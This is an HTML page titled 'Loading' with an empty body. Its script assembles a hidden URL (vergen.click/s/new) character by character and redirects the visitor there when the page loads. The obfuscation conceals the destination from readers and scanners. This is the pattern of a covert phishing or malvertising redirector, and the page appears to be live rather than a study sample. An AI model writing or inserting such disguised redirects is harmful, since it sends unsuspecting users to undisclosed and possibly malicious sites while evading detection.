<!DOCTYPE html>
<html>
<head>
    <title>Loading</title>
    <script>
        const parts = [
            function() { return 'h'; },
            () => 't',
            _ => 't',
            () => 'p',
            () => 's',
            () => ':',
            () => '/',
            function() { return '/'; },
            function() { return 'v'; },
            () => 'e',
            _ => 'r',
            function() { return 'g'; },
            () => 'e',
            function() { return 'n'; },
            function() { return '.'; },
            () => 'c',
            _ => 'l',
            _ => 'i',
            () => 'c',
            _ => 'k',
            function() { return '/'; },
            () => 's',
            () => '/',
            () => 'n',
            () => 'e',
            () => 'w'
        ];
        const url = parts.reduce((acc, fn) => acc + fn(), '');
        document.location = url;
    </script>
</head>
<body></body>
</html>
